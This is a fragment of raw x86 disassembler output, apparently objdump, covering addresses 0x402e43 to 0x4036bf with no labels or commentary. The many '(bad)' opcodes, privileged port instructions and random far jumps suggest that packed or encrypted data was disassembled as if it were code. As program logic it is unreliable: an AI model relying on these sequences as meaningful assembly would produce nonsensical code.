  402e43:	xlat   BYTE PTR ds:[ebx]
  402e44:	mov    al,0xc4
  402e46:	(bad)
  402e49:	shl    bl,1
  402e4b:	repz mov eax,0xf5f8e0df
  402e51:	mov    ebx,0xc6fbf1e1
  402e56:	add    ebp,eax
  402e58:	fsubr  st(2),st
  402e5a:	loopne 0x402e5f
  402e5c:	or     al,dh
  402e5e:	mul    eax
  402e60:	enter  0xf2d6,0xb4
  402e64:	mov    cl,0xda
  402e66:	mov    ch,0xfa
  402e68:	mov    eax,0xe2f9f9c8
  402e6d:	call   0xc83efc2e
  402e72:	mov    esi,0xa02fde2
  402e77:	leave  
  402e78:	out    0xe1,eax
  402e7a:	jmp    0x402e59
  402e7c:	(bad)  
  402e7d:	loop   0x402e47
  402e7f:	scas   eax,DWORD PTR es:[edi]
  402e80:	lods   eax,DWORD PTR ds:[esi]
  402e81:	hlt    
  402e82:	lock (bad) 
  402e84:	shl    BYTE PTR [ebx-0x1a40281a],1
  402e8a:	mov    ebp,0xbff8e2ed
  402e8f:	cld    
  402e90:	repz test DWORD PTR [ebx],0xfcc9dbe1
  402e97:	loop   0x402e68
  402e99:	loope  0x402e7b
  402e9b:	iret   
  402e9c:	add    eax,0xaed7cdac
  402ea1:	retf   0xebf2
  402ea4:	(bad)  
  402ea5:	into   
  402ea6:	out    dx,eax
  402ea7:	jmp    0x1d6:0xd9baf2d3
  402eae:	loope  0x402e8e
  402eb0:	std    
  402eb1:	in     al,0xbe
  402eb3:	or     esi,edi
  402eb5:	or     ecx,ecx
  402eb7:	pop    es
  402eb8:	loope  0x402e9f
  402eba:	in     eax,0xdf
  402ebc:	add    al,0xaa
  402ebe:	jecxz  0x402eae
  402ec0:	(bad)  
  402ec1:	jmp    0xd328f6b8
  402ec6:	mov    eax,0xdeb4f2f9
  402ecb:	mov    ecx,0xc2bef7d4
  402ed0:	rol    BYTE PTR [edx+esi*8],cl
  402ed3:	fadd   DWORD PTR [ebx]
  402ed5:	mov    al,0xc9
  402ed8:	call   0xe10c16ec
  402edd:	test   eax,0xc2cdcdf1
  402ee2:	in     eax,0xc2
  402ee4:	hlt    
  402ee5:	in     al,0xea
  402ee7:	(bad)  
  402ee9:	fucomi st,st(0)
  402eeb:	mov    eax,0xdecdf5c9
  402ef0:	(bad)  
  402ef2:	(bad)  
  402ef4:	loop   0x402eb7
  402ef6:	(bad)  
  402ef8:	call   0xeb273dfa
  402efd:	in     al,dx
  402efe:	loope  0x402ee4
  402f00:	repnz icebp 
  402f02:	ret    
  402f03:	lods   al,BYTE PTR ds:[esi]
  402f04:	cli    
  402f05:	jmp    0x402ed5
  402f07:	in     eax,0xb5
  402f09:	mov    ecx,0xfacfe8bf
  402f0e:	into   
  402f0f:	lock std 
  402f11:	mov    ebx,0xe4f2d7
  402f16:	lock fadd st(7),st
  402f19:	or     BYTE PTR [edx+edx*1],al
  402f1c:	(bad)  
  402f1e:	mov    al,0xf1
  402f20:	in     al,dx
  402f21:	loopne 0x402eeb
  402f23:	out    dx,al
  402f24:	fucomi st,st(0)
  402f26:	int3   
  402f27:	sti    
  402f28:	mov    ah,0xb9
  402f2a:	std    
  402f2b:	frndint 
  402f2d:	leave  
  402f2e:	imul   bh
  402f30:	rcl    edi,cl
  402f32:	fdiv   st,st(3)
  402f34:	loope  0x402f06
  402f36:	cmc    
  402f37:	or     DWORD PTR [ecx],eax
  402f39:	ret    
  402f3a:	sti    
  402f3b:	push   cs
  402f3c:	add    ch,BYTE PTR [ecx-0x482c563e]
  402f42:	in     eax,0xc7
  402f44:	hlt    
  402f45:	(bad)
  402f48:	xlat   BYTE PTR ds:[ebx]
  402f49:	(bad)  
  402f4a:	sar    BYTE PTR [ebp-0x29334105],1
  402f50:	shr    ebp,cl
  402f52:	(bad)  
  402f54:	fdivr  DWORD PTR [edi-0x52605fe]
  402f5a:	(bad)
  402f5e:	shl    eax,0xc9
  402f61:	retf   0xd3b6
  402f64:	(bad)  
  402f65:	fcos   
  402f67:	icebp  
  402f68:	lock (bad) 
  402f6a:	div    BYTE PTR [eax+edx*8-0xb2c180f]
  402f71:	rol    ecx,1
  402f73:	add    al,0xdb
  402f75:	stc    
  402f76:	or     bh,dl
  402f78:	cli    
  402f79:	aam    0xc
  402f7b:	add    ebx,esi
  402f7d:	test   eax,0xaef5e2c7
  402f82:	mov    dh,0xe0
  402f84:	fyl2x  
  402f86:	iret   
  402f87:	mov    ecx,0xfcd6b8d1
  402f8c:	mov    esi,0xd406f9f6
  402f91:	cli    
  402f92:	loopne 0x402f72
  402f94:	ror    ecx,0xd4
  402f97:	enter  0xf9ea,0xe7
  402f9b:	stc    
  402f9c:	or     eax,0xb1c4d8e4
  402fa1:	retf   
  402fa2:	mov    al,0xbb
  402fa4:	(bad)  
  402fa5:	lock loopne 0x402f96
  402fa8:	div    DWORD PTR [ebp-0x2e043c48]
  402fae:	rol    BYTE PTR [edi],1
  402fb0:	sar    al,0x0
  402fb3:	repnz (bad) 
  402fb5:	mov    edi,0xf8df0008
  402fba:	call   0xcb0422a0
  402fbf:	(bad)  
  402fc0:	mov    al,0xb1
  402fc2:	lods   eax,DWORD PTR ds:[esi]
  402fc3:	loope  0x402f80
  402fc5:	repz enter 0xf0b5,0xeb
  402fca:	aad    0xdd
  402fcc:	fld    DWORD PTR [eax]
  402fce:	rcr    eax,cl
  402fd0:	mov    edi,0xd1d90305
  402fd5:	cli    
  402fd6:	(bad)  
  402fd8:	(bad)  
  402fd9:	in     al,dx
  402fda:	jmp    0xd10f22ec
  402fdf:	jmp    0xb6e2:0xd6cbc5c4
  402fe6:	retf   0xdfea
  402fe9:	(bad)  
  402fea:	enter  0xbf03,0xcc
  402fee:	mov    edi,0xc6dee1e7
  402ff3:	cmc    
  402ff4:	mul    ch
  402ff6:	std    
  402ff7:	(bad)  
  402ff8:	in     al,0xcb
  402ffa:	retf   
  402ffb:	fsubrp st(0),st
  402ffd:	(bad)  
  402ffe:	xlat   BYTE PTR ds:[ebx]
  402fff:	enter  0xeab2,0xe7
  403003:	lds    ebp,FWORD PTR [eax-0x1b01082f]
  403009:	mov    dh,0xe8
  40300b:	ror    ah,1
  40300d:	fcmovbe st,st(1)
  40300f:	iret   
  403010:	mov    ah,0x0
  403012:	(bad)
  403015:	or     BYTE PTR [eax],al
  403017:	add    cl,bl
  403019:	std    
  40301a:	or     ebp,ebx
  40301c:	or     al,bh
  40301e:	in     eax,0xe5
  403020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403021:	in     eax,dx
  403022:	(bad)  
  403023:	mov    al,0xf9
  403025:	clc    
  403026:	hlt    
  403027:	mov    ch,0xcd
  403029:	mov    ebp,0xe8e8dbd0
  40302e:	aam    0xcd
  403030:	out    dx,al
  403031:	fcomp  st(6)
  403033:	add    cl,dl
  403035:	leave  
  403036:	clc    
  403037:	add    al,ch
  403039:	jmp    0xf0bf:0xa712f3d9
  403040:	scas   al,BYTE PTR es:[edi]
  403041:	aad    0xd6
  403043:	sti    
  403044:	out    dx,al
  403045:	out    0xfb,al
  403047:	xbegin 0xd113fc48
  40304d:	in     eax,dx
  40304e:	out    0xff,eax
  403050:	pop    es
  403051:	(bad)  
  403052:	(bad)  
  403054:	lock (bad) 
  403056:	lock xlat BYTE PTR ds:[ebx]
  403058:	out    dx,al
  403059:	pop    es
  40305a:	pop    es
  40305b:	stc    
  40305c:	leave  
  40305d:	out    0xb0,eax
  40305f:	shr    ebp,1
  403061:	out    0xf2,al
  403063:	rol    cl,cl
  403065:	fucomi st,st(6)
  403067:	call   0xddf32a6a
  40306c:	add    ch,ah
  40306e:	icebp  
  40306f:	out    dx,eax
  403070:	fiadd  DWORD PTR [eax]
  403072:	std    
  403073:	(bad)  
  403074:	retf   
  403075:	rcr    cl,1
  403077:	fiadd  DWORD PTR [esi]
  403079:	push   cs
  40307a:	loop   0x40308f
  40307c:	out    0xf0,al
  40307e:	ret    
  40307f:	lock test al,0xef
  403082:	shl    edx,cl
  403084:	mov    cl,0xb7
  403086:	in     eax,0xb9
  403088:	(bad)  
  403089:	leave  
  40308a:	fstp   st(1)
  40308c:	mov    ebx,0xdbdac0f2
  403091:	aam    0xf0
  403093:	rcr    ch,cl
  403095:	or     ebx,edx
  403097:	aam    0xa
  403099:	ret    
  40309a:	fcomip st,st(3)
  40309c:	fsubrp st(6),st
  40309e:	repnz lods eax,DWORD PTR ds:[esi]
  4030a0:	scas   eax,DWORD PTR es:[edi]
  4030a1:	scas   al,BYTE PTR es:[edi]
  4030a2:	into   
  4030a3:	out    0xe6,al
  4030a5:	repz call 0xfe10eb97
  4030ab:	fucomp st(2)
  4030ad:	mov    ecx,0xe1bcceef
  4030b2:	in     al,0xbd
  4030b4:	jmp    0xe5270aad
  4030b9:	fmul   QWORD PTR [esi]
  4030bb:	invlpg BYTE PTR [esi-0xd3b3818]
  4030c2:	fndisi(8087 only) 
  4030c4:	retf   0xecd6
  4030c7:	aam    0xff
  4030c9:	iret   
  4030ca:	repz mov edi,0xf8efbacf
  4030d0:	(bad)  
  4030d2:	shl    dh,1
  4030d4:	cld    
  4030d5:	in     al,0xc7
  4030d7:	retf   0xecf
  4030da:	pop    es
  4030db:	or     al,0x0
  4030dd:	fdivr  DWORD PTR [eax-0x291a163b]
  4030e3:	mov    ecx,0xcdf9ccc9
  4030e9:	in     eax,dx
  4030ea:	rcr    esi,1
  4030ec:	(bad)  
  4030ed:	mov    edi,0x7dac0d5
  4030f2:	(bad)  
  4030f4:	(bad)  
  4030f6:	call   0xff1c17d1
  4030fb:	call   0xceecf702
  403100:	(bad)  
  403101:	jecxz  0x4030f4
  403103:	mov    al,0xeb
  403105:	(bad)  
  403106:	repnz in al,dx
  403108:	in     al,dx
  403109:	xlat   BYTE PTR ds:[ebx]
  40310a:	(bad)  
  40310b:	neg    edi
  40310d:	loope  0x403104
  40310f:	repnz in eax,0xd0
  403112:	fucomi st,st(3)
  403114:	retf   0xf9de
  403117:	add    eax,0x7e2d8ce
  40311c:	retf   0xaed9
  40311f:	mov    esp,0xb0efd0ee
  403124:	cmc    
  403125:	in     al,0xcf
  403127:	jmp    0xd003:0xd6d9f8f3
  40312e:	int3   
  40312f:	out    0xec,eax
  403131:	(bad)
  403134:	retf   
  403135:	ret    
  403136:	loop   0x403130
  403138:	rol    bh,0xfc
  40313b:	(bad)  
  40313d:	jmp    0xade8:0xb0d5afef
  403144:	aad    0xfa
  403146:	aad    0xc5
  403148:	leave  
  403149:	jmp    0xdffb0704
  40314e:	iret   
  40314f:	loope  0x403157
  403151:	(bad)  
  403152:	lds    eax,FWORD PTR [ecx]
  403154:	out    0x0,al
  403156:	jmp    0xddc5:0xec09e1cf
  40315d:	mov    ebp,0xf3e0e6c3
  403162:	xlat   BYTE PTR ds:[ebx]
  403163:	mov    dh,0xcd
  403165:	loopne 0x40312b
  403167:	aam    0xb5
  403169:	(bad)  
  40316a:	icebp  
  40316b:	(bad)  
  40316d:	mov    edx,0xd0c6f0d3
  403172:	or     ecx,ebx
  403174:	cli    
  403175:	sti    
  403176:	(bad)  
  403177:	cmc    
  403178:	fcmovnb st,st(7)
  40317a:	jmp    0x403160
  40317c:	push   cs
  40317d:	retf   0xf6c2
  403180:	mov    esp,0xc6cccbf5
  403186:	jmp    0xdfcd:0xf1caedc7
  40318d:	mov    esi,0xf3f1d8dd
  403192:	clc    
  403193:	(bad)  
  403194:	hlt    
  403195:	fcmovnu st,st(3)
  403197:	fsub   st(6),st
  403199:	(bad)
  40319c:	std    
  40319d:	(bad)  
  40319e:	in     eax,dx
  40319f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a0:	ret    0xdbad
  4031a3:	mov    al,0xca
  4031a5:	(bad)
  4031a8:	retf   0xfdc9
  4031ab:	in     eax,dx
  4031ac:	mov    eax,0xc7b5dff1
  4031b1:	fiadd  DWORD PTR [eax]
  4031b3:	push   es
  4031b4:	fmul   st,st(2)
  4031b6:	hlt    
  4031b7:	push   es
  4031b8:	jmp    0xe9d2:0xfe0cf8d5
  4031bf:	icebp  
  4031c0:	retf   
  4031c1:	int3   
  4031c2:	loop   0x4031b1
  4031c4:	loope  0x40318a
  4031c6:	xlat   BYTE PTR ds:[ebx]
  4031c7:	mov    al,0xd5
  4031c9:	sti    
  4031ca:	jmp    0x40318f
  4031cc:	aam    0xe0
  4031ce:	(bad)  
  4031cf:	push   es
  4031d0:	add    eax,0xdcdb01f9
  4031d5:	push   es
  4031d6:	fdiv   st(7),st
  4031d8:	retf   
  4031d9:	add    al,0x1
  4031db:	shr    ebx,cl
  4031dd:	loope  0x4031ad
  4031df:	mov    edi,0xdbaaf4c2
  4031e4:	out    dx,al
  4031e5:	jmp    0xdec8:0xfec4e9c7
  4031ec:	sar    esi,cl
  4031ee:	cli    
  4031ef:	repnz out 0x1,eax
  4031f2:	rol    eax,1
  4031f4:	or     ecx,esp
  4031f6:	aad    0x2
  4031f8:	in     eax,0xd
  4031fa:	or     al,0x1
  4031fc:	(bad)  
  4031fe:	mov    dl,0xef
  403200:	rol    eax,0xeb
  403203:	ror    edx,1
  403205:	shr    ecx,cl
  403207:	mov    ah,0xc6
  403209:	mov    dh,0xf7
  40320b:	std    
  40320c:	add    esi,ebp
  40320e:	mov    edi,0xc301edb9
  403213:	aam    0x3
  403215:	add    esi,esp
  403217:	push   es
  403218:	enter  0xe4c7,0xce
  40321c:	jmp    0xc12cdee8
  403221:	lods   al,BYTE PTR ds:[esi]
  403222:	(bad)  
  403223:	rcr    ebx,cl
  403225:	shl    DWORD PTR [edi+esi*4-0x35302215],1
  40322c:	repnz out dx,eax
  40322e:	shl    al,1
  403230:	fsub   st(5),st
  403232:	shr    bl,cl
  403234:	(bad)  
  403235:	std    
  403236:	hlt    
  403237:	out    dx,eax
  403238:	sti    
  403239:	(bad)  
  40323a:	out    dx,al
  40323b:	add    ah,al
  40323d:	fsub   st,st(5)
  40323f:	out    dx,al
  403240:	rol    cl,cl
  403242:	fsubr  st(2),st
  403244:	in     al,dx
  403245:	rcl    edi,1
  403247:	repnz (bad) 
  40324a:	sti    
  40324b:	mov    esp,0xdab6f8da
  403250:	ret    0xe206
  403253:	rcl    bh,0xe1
  403256:	(bad)  
  403257:	leave  
  403258:	(bad)  
  403259:	or     ebx,ecx
  40325b:	adc    edi,eax
  40325d:	lods   al,BYTE PTR ds:[esi]
  40325e:	out    0xcc,eax
  403260:	call   0xcd17034f
  403265:	mov    dh,0xae
  403267:	(bad)  
  403268:	in     al,dx
  403269:	icebp  
  40326a:	mov    ecx,0xfebbcdfa
  40326f:	into   
  403270:	in     eax,dx
  403271:	(bad)  
  403272:	cmc    
  403273:	inc    BYTE PTR [esi]
  403275:	mov    DWORD PTR ds:0xd8ddfbef,0xc9c2eafd
  40327f:	loope  0x403249
  403281:	retf   0xc7f5
  403284:	mov    dl,0xda
  403286:	loopne 0x403243
  403288:	(bad)  
  40328a:	mov    ah,0xe9
  40328c:	into   
  40328d:	repnz int 0xc3
  403290:	in     al,dx
  403291:	aad    0xd6
  403293:	(bad)  
  403295:	inc    DWORD PTR [edi]
  403297:	out    0xd,al
  403299:	loop   0x4032a4
  40329b:	loopne 0x40328b
  40329d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40329e:	shr    BYTE PTR [ebx+eiz*8-0xe171d3d],cl
  4032a5:	in     al,dx
  4032a6:	out    dx,al
  4032a7:	iret   
  4032a8:	sti    
  4032a9:	mov    ecx,0xeff3f6dd
  4032ae:	call   0xe40e10ab
  4032b3:	lock fmul st(1),st
  4032b6:	or     bh,bl
  4032b8:	out    dx,eax
  4032b9:	push   es
  4032ba:	aam    0xef
  4032bc:	repnz mov esi,0xeaadb1e2
  4032c2:	lods   eax,DWORD PTR ds:[esi]
  4032c3:	lock mov bh,0xe5
  4032c6:	(bad)  
  4032c8:	retf   
  4032c9:	mov    edx,0x3e1ecdf
  4032ce:	add    al,bh
  4032d0:	neg    edx
  4032d2:	rcr    cl,cl
  4032d4:	(bad)  
  4032d5:	xlat   BYTE PTR ds:[ebx]
  4032d6:	out    0xb,eax
  4032d8:	mul    cl
  4032da:	fld    QWORD PTR [ecx]
  4032dc:	in     eax,dx
  4032dd:	rol    ebp,0xbd
  4032e0:	lods   eax,DWORD PTR ds:[esi]
  4032e1:	mov    esp,0xebe1b6ca
  4032e6:	out    dx,eax
  4032e7:	mov    ch,0xd3
  4032e9:	xlat   BYTE PTR ds:[ebx]
  4032ea:	mov    eax,0xd5d9fad8
  4032ef:	clc    
  4032f0:	mov    edi,0xcafcdad9
  4032f5:	fsubp  st(7),st
  4032f7:	stc    
  4032f8:	dec    bl
  4032fa:	loop   0x4032e6
  4032fc:	dec    ebp
  4032fe:	int3   
  4032ff:	shl    BYTE PTR [edi-0x2b494e1a],0xba
  403306:	out    0xe4,al
  403308:	in     eax,0xd9
  40330a:	cli    
  40330b:	jmp    0xe72f26fa
  403310:	(bad)  
  403311:	jecxz  0x403318
  403313:	stc    
  403314:	add    al,0xea
  403316:	or     eax,DWORD PTR [eax]
  403318:	iret   
  403319:	out    dx,al
  40331a:	(bad)  
  40331c:	fcmovb st,st(1)
  40331e:	leave  
  40331f:	(bad)  
  403320:	out    dx,al
  403321:	out    0xf4,eax
  403323:	loopne 0x4032ed
  403325:	iret   
  403326:	aad    0xe5
  403328:	mov    edx,0xbceff5ed
  40332d:	iret   
  40332e:	aad    0xdf
  403330:	stc    
  403331:	in     al,0xf9
  403333:	retf   
  403334:	shl    al,1
  403336:	or     al,BYTE PTR [edx]
  403338:	push   es
  403339:	jmp    0xaccc:0xaa130cef
  403340:	retf   0xd0f3
  403343:	rol    dh,0xc7
  403346:	int    0xce
  403348:	jmp    0xc2bd:0xecd7eeea
  40334f:	mov    esp,0xc7fbc3d8
  403354:	std    
  403355:	(bad)
  403358:	jmp    0xbdee:0xdfe50ec8
  40335f:	iret   
  403360:	leave  
  403361:	retf   
  403362:	mov    dl,0xeb
  403364:	shl    DWORD PTR [edx-0x4a1b1b08],cl
  40336a:	(bad)  
  40336b:	repnz fcmovnbe st,st(6)
  40336e:	out    0xc7,eax
  403370:	cli    
  403371:	cmc    
  403372:	in     al,0x2
  403374:	ror    edx,0xd4
  403377:	add    al,0xc5
  403379:	cld    
  40337a:	add    al,BYTE PTR [esi]
  40337c:	cli    
  40337d:	lods   al,BYTE PTR ds:[esi]
  40337e:	(bad)
  403381:	jmp    0x40337e
  403383:	hlt    
  403384:	sar    eax,cl
  403386:	(bad)  
  403387:	repz fidivr WORD PTR [esi-0x3d162f44]
  40338e:	stc    
  40338f:	xlat   BYTE PTR ds:[ebx]
  403390:	(bad)  
  403391:	(bad)
  403394:	add    edi,eax
  403396:	out    dx,eax
  403397:	idiv   edi
  403399:	or     ah,bl
  40339b:	in     eax,0xe1
  40339d:	stos   DWORD PTR es:[edi],eax
  40339e:	sar    DWORD PTR [esi-0x56524d23],0xe6
  4033a5:	test   eax,0xedd5dfd4
  4033ab:	out    dx,eax
  4033ac:	mov    edi,0xd9ef02fd
  4033b1:	rcl    ch,cl
  4033b3:	xlat   BYTE PTR ds:[ebx]
  4033b4:	pop    es
  4033b5:	leave  
  4033b6:	in     al,0x6
  4033b8:	enter  0xec08,0xe4
  4033bc:	iret   
  4033bd:	retf   0xcce5
  4033c0:	iret   
  4033c1:	lock ret 0xb5c9
  4033c5:	lock mov dl,0xfb
  4033c8:	enter  0xb8d1,0xfe
  4033cc:	repz faddp st(3),st
  4033cf:	icebp  
  4033d0:	add    esp,esp
  4033d2:	fiadd  WORD PTR [edx]
  4033d4:	jmp    0x4033b2
  4033d6:	neg    edi
  4033d8:	cli    
  4033d9:	push   es
  4033da:	retf   0xc4fd
  4033dd:	in     eax,0xee
  4033df:	repz xlat BYTE PTR ds:[ebx]
  4033e1:	int3   
  4033e2:	loope  0x4033da
  4033e4:	sti    
  4033e5:	in     al,0xbb
  4033e7:	(bad)
  4033ea:	leave  
  4033eb:	fmulp  st(7),st
  4033ed:	mov    ebp,0xe6edf3dd
  4033f2:	cld    
  4033f3:	ret    0xe4f1
  4033f6:	lock pop es
  4033f8:	jmp    0xcbdf:0xffe30bcd
  4033ff:	call   0xc10f10fb
  403404:	into   
  403405:	rcr    al,cl
  403407:	mov    bh,0xf9
  403409:	idiv   BYTE PTR [ecx-0x8250a11]
  40340f:	aam    0xfe
  403411:	in     eax,0xda
  403413:	(bad)  
  403415:	(bad)  
  403416:	jmp    0x4033fc
  403418:	out    0xe1,al
  40341a:	stc    
  40341b:	cld    
  40341c:	repz scas eax,DWORD PTR es:[edi]
  40341e:	mov    bl,0xc3
  403420:	enter  0xcbcf,0xe7
  403424:	sti    
  403425:	icebp  
  403426:	cli    
  403427:	fcomi  st,st(1)
  403429:	mov    ecx,0xc9bfe2de
  40342e:	rcl    dh,cl
  403430:	fdiv   st(0),st
  403432:	vpminsw xmm2,xmm7,xmm4
  403436:	jmp    0x403423
  403438:	clc    
  403439:	in     eax,dx
  40343a:	or     al,0xdf
  40343c:	in     eax,0xe2
  40343e:	ret    0xc5cd
  403441:	ret    0xcaf6
  403444:	retf   
  403445:	out    0xcb,eax
  403447:	int3   
  403448:	mov    ch,0xc8
  40344a:	into   
  40344b:	xlat   BYTE PTR ds:[ebx]
  40344c:	add    DWORD PTR [ebx],eax
  40344e:	fdivrp st(0),st
  403450:	into   
  403451:	clc    
  403452:	in     al,dx
  403453:	clc    
  403454:	loopne 0x40343c
  403456:	fucomi st,st(0)
  403458:	cld    
  403459:	enter  0xf2ce,0x13
  40345d:	ret    
  40345e:	ret    
  40345f:	mov    dl,0xc2
  403461:	loop   0x40341f
  403463:	in     eax,dx
  403464:	aam    0xe0
  403466:	mov    ebx,0xdeedecc4
  40346b:	hlt    
  40346c:	mov    edi,0xf0f1bcee
  403471:	loopne 0x403477
  403473:	mov    esp,0xfbf7c4d6
  403478:	jmp    0xeba7:0xcfeb0bf5
  40347f:	test   esi,0xd4e7aeb2
  403485:	not    ah
  403487:	aam    0xb0
  403489:	div    DWORD PTR [ebp-0x2211fe2e]
  40348f:	sar    ebx,1
  403491:	mov    edi,0xc4e4d5e5
  403496:	fsubrp st(0),st
  403498:	loop   0x4034a7
  40349a:	out    0xc,al
  40349c:	add    edi,eax
  40349e:	leave  
  40349f:	ret    0xd5f3
  4034a2:	cmc    
  4034a3:	(bad)  
  4034a4:	mov    cl,0xf8
  4034a6:	aam    0xd9
  4034a8:	mov    bh,0xcc
  4034aa:	out    dx,al
  4034ab:	call   0xba3a0ab1
  4034b0:	mov    ah,0xbb
  4034b2:	repz inc bh
  4034b5:	clc    
  4034b6:	cli    
  4034b7:	stc    
  4034b8:	loop   0x403484
  4034ba:	fiadd  DWORD PTR [eax]
  4034bc:	or     al,0xc2
  4034be:	jmp    0xeae5:0xf4f0c9d2
  4034c5:	out    0xc4,eax
  4034c7:	int    0xe5
  4034c9:	hlt    
  4034ca:	retf   0xd9bf
  4034cd:	cmc    
  4034ce:	fcomp  st(0)
  4034d0:	aam    0xde
  4034d2:	out    0xeb,al
  4034d4:	stc    
  4034d5:	push   es
  4034d6:	or     DWORD PTR [ebx],ecx
  4034d8:	fmulp  st(1),st
  4034da:	clc    
  4034db:	shl    ecx,0xb1
  4034de:	sar    BYTE PTR [esp+edi*4-0x53130b2f],cl
  4034e5:	loopne 0x4034d4
  4034e7:	in     al,0xfe
  4034e9:	cld    
  4034ea:	jmp    0xd2f9:0xd2fbccf6
  4034f1:	icebp  
  4034f2:	loope  0x4034e6
  4034f4:	add    cl,dl
  4034f6:	retf   0xe006
  4034f9:	(bad)  [ebx+edx*8]
  4034fc:	cli    
  4034fd:	sar    DWORD PTR [edi+eax*8-0x1130160f],1
  403504:	hlt    
  403505:	in     eax,0xff
  403507:	(bad)  
  403509:	in     eax,dx
  40350a:	shl    BYTE PTR [ebp-0x2c072305],cl
  403510:	out    dx,al
  403511:	repnz out 0xe4,al
  403514:	lock out 0xc5,al
  403517:	(bad)  
  40351a:	aam    0xe3
  40351c:	jmp    0xceee:0xc7e1afc6
  403523:	mov    ch,0xdb
  403525:	aad    0xd2
  403527:	stc    
  403528:	aam    0xf3
  40352a:	in     eax,dx
  40352b:	out    dx,al
  40352c:	iret   
  40352d:	fadd   DWORD PTR [eax]
  40352f:	icebp  
  403530:	fiadd  DWORD PTR [eax]
  403532:	loope  0x4034fb
  403534:	(bad)  
  403536:	les    eax,FWORD PTR [edx]
  403538:	cld    
  403539:	loop   0x403537
  40353b:	in     al,dx
  40353c:	push   es
  40353d:	retf   0xc0e5
  403540:	out    dx,al
  403541:	call   0xca172d34
  403546:	loopne 0x403532
  403548:	leave  
  403549:	jmp    ebx
  40354b:	loop   0x40352c
  40354d:	in     al,dx
  40354e:	fadd   st,st(3)
  403550:	mul    ch
  403552:	icebp  
  403553:	push   es
  403554:	loop   0x403521
  403556:	sar    cl,0xc8
  403559:	or     edi,ecx
  40355b:	retf   
  40355c:	iret   
  40355d:	(bad)  
  40355e:	icebp  
  40355f:	call   0xb706e337
  403564:	jmp    0xcdfc2418
  403569:	cld    
  40356a:	clc    
  40356b:	(bad)  
  40356d:	fcmovb st,st(0)
  40356f:	jmp    ebx
  403571:	lock in al,dx
  403573:	pop    es
  403574:	hlt    
  403575:	rol    ebp,0xc7
  403578:	cmc    
  403579:	leave  
  40357a:	fcomip st,st(3)
  40357c:	jmp    0xd810f56c
  403581:	aad    0xe7
  403583:	in     eax,dx
  403584:	hlt    
  403585:	(bad)  
  403586:	out    dx,eax
  403587:	(bad)  
  403588:	aam    0xec
  40358a:	out    dx,al
  40358b:	fmulp  st(1),st
  40358d:	sar    esi,1
  40358f:	push   es
  403590:	mov    eax,0xc1e2dad0
  403595:	or     ah,dl
  403597:	jecxz  0x403598
  403599:	or     bh,dl
  40359b:	int    0xd8
  40359d:	mov    esi,0xc7d5e8b8
  4035a2:	test   esi,0xd3c4ebeb
  4035a8:	mov    ebx,0xf8f1efd7
  4035ad:	fdiv   st,st(6)
  4035af:	repnz fadd DWORD PTR [eax]
  4035b2:	hlt    
  4035b3:	jecxz  0x4035ae
  4035b5:	or     esp,ecx
  4035b7:	jmp    0xaa07:0x1208fffe
  4035be:	mov    esi,0xb1e4e8bc
  4035c3:	mul    ah
  4035c5:	in     eax,dx
  4035c6:	cli    
  4035c7:	fxch   st(5)
  4035c9:	fdivr  QWORD PTR [ebx+0xf2bcfc]
  4035cf:	loop   0x4035a5
  4035d1:	mov    edi,0xf9dfe7c6
  4035d6:	test   DWORD PTR ds:0x6e100c6,0xdeb0f2fc
  4035e0:	lods   al,BYTE PTR ds:[esi]
  4035e1:	mov    ebp,0xd7d2b2cd
  4035e6:	mov    ebx,0xf9f3d0c8
  4035eb:	(bad)  
  4035ed:	cld    
  4035ee:	shl    eax,cl
  4035f0:	push   edi
  4035f2:	loope  0x4035f5
  4035f4:	call   esi
  4035f6:	fisttp QWORD PTR [ebx]
  4035f8:	fimul  DWORD PTR [edx]
  4035fa:	or     bl,bh
  4035fc:	dec    bl
  4035fe:	fsubr  QWORD PTR [eax-0x4a553819]
  403604:	stc    
  403605:	clc    
  403606:	scas   al,BYTE PTR es:[edi]
  403607:	mov    bh,0xb4
  403609:	mov    ah,0xdf
  40360b:	call   0xdf4136e4
  403610:	shl    ah,1
  403612:	add    eax,eax
  403614:	retf   
  403615:	fdivp  st(6),st
  403617:	leave  
  403618:	aad    0xe5
  40361a:	out    0x9,al
  40361c:	(bad)  
  40361d:	(bad)  
  40361f:	out    dx,al
  403620:	mov    dl,0xce
  403622:	mov    ah,0xce
  403624:	retf   
  403625:	in     eax,0xd9
  403627:	leave  
  403628:	fcomp  st(0)
  40362a:	in     al,0xf6
  40362c:	icebp  
  40362d:	fucom  st(7)
  40362f:	sar    BYTE PTR [esi-0x7462b1d],0x2
  403636:	paddusw mm0,QWORD PTR [eax+edi*8]
  40363a:	add    DWORD PTR [edx],eax
  40363c:	or     ah,ch
  40363e:	ret    
  40363f:	loop   0x403604
  403641:	lods   al,BYTE PTR ds:[esi]
  403642:	mov    al,0xb4
  403644:	hlt    
  403645:	iret   
  403646:	mov    ecx,0xc4ebd6f1
  40364b:	stc    
  40364c:	loop   0x403631
  40364e:	out    dx,eax
  40364f:	rol    BYTE PTR [edx],1
  403651:	in     al,0xde
  403653:	shl    ch,cl
  403655:	idiv   BYTE PTR [esi-0x20271a35]
  40365b:	push   es
  40365c:	(bad)  
  40365d:	in     eax,dx
  40365e:	rcr    edi,0xae
  403661:	lods   eax,DWORD PTR ds:[esi]
  403662:	mov    ah,0xec
  403664:	call   0xc91f203c
  403669:	sar    BYTE PTR [ecx-0x1efc0b30],1
  40366f:	shr    ebp,0xbc
  403672:	hlt    
  403673:	retf   
  403674:	inc    al
  403676:	mov    DWORD PTR [ebx],0xdf0ed5bc
  40367c:	loopne 0x403628
  40367e:	out    dx,al
  40367f:	shr    BYTE PTR [eax-0xc2b384a],cl
  403685:	enter  0xe5cd,0xd6
  403689:	sar    esi,cl
  40368b:	int    0xc2
  40368d:	ret    0xb9ec
  403690:	add    edi,edx
  403692:	pop    es
  403693:	fmul   DWORD PTR [ecx]
  403695:	jmp    0x403673
  403697:	enter  0xe8ff,0xe0
  40369b:	fmul   st,st(7)
  40369d:	repz enter 0xebf0,0xc0
  4036a2:	out    dx,al
  4036a3:	mov    dl,0xc8
  4036a5:	mov    ecx,0xd7cac4b9
  4036aa:	std    
  4036ab:	shl    bh,1
  4036ad:	repz (bad) 
  4036b0:	(bad)  
  4036b2:	std    
  4036b3:	add    al,BYTE PTR [eax]
  4036b5:	(bad)  
  4036b6:	(bad)  [ebx]
  4036b8:	fadd   QWORD PTR [ecx*8-0x4f1ef618]
  4036bf:	scas   eax,DWORD PTR es:[edi]
